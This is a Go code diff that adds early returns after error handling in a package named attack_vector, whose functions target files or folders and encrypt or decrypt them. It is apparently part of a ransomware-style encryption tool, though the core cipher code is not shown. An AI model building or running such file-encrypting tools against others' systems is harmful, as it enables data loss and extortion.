@@ -38,6 +38,7 @@ func SetTarget(path string) { // Either a file or a folder
 	info, err := os.Stat(path)
 	if err != nil { // The target didn't exist
 		notify.Error(err.Error(), "attack_vector.SetTarget()")
+		return
 	}
 	if info.IsDir() {
 		c_target.target_type = "dir"
@@ -68,6 +69,7 @@ func SetEncryptionMethod(method string) {
 	}
 	if !found {
 		notify.Error("Unknown encryiption methond "+method, "attack_vector.SetEncryptionMethod()")
+		return
 	}
 
 	c_target.encryption_method = method
@@ -98,6 +100,7 @@ func EncryptFolder(dir string) {
 	folder, err := os.Open(dir)
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.EncryptFolder()")
+		return
 	}
 	children, _ := folder.Readdir(0)
 	for _, child := range children {
@@ -113,6 +116,7 @@ func EncryptFile(file string) {
 	in, err := os.Open(file) // Target
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.EncryptFile()")
+		return
 	}
 	enc_file, _ := os.Create(file + "_encrypted") // Our new file
 	// Read every line
@@ -133,6 +137,7 @@ func DecryptFolder(dir string) {
 	folder, err := os.Open(dir)
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.DecryptFolder()")
+		return
 	}
 	children, _ := folder.Readdir(0)
 	for _, child := range children {
@@ -146,6 +151,7 @@ func DecryptFile(file string) {
 	in, err := os.Open(file) // Target
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.EncryptFile()")
+		return
 	}
 	file = strings.ReplaceAll(file, "_encrypted", "")
 	enc_file, _ := os.Create(file + "_decrypted") // Our new file
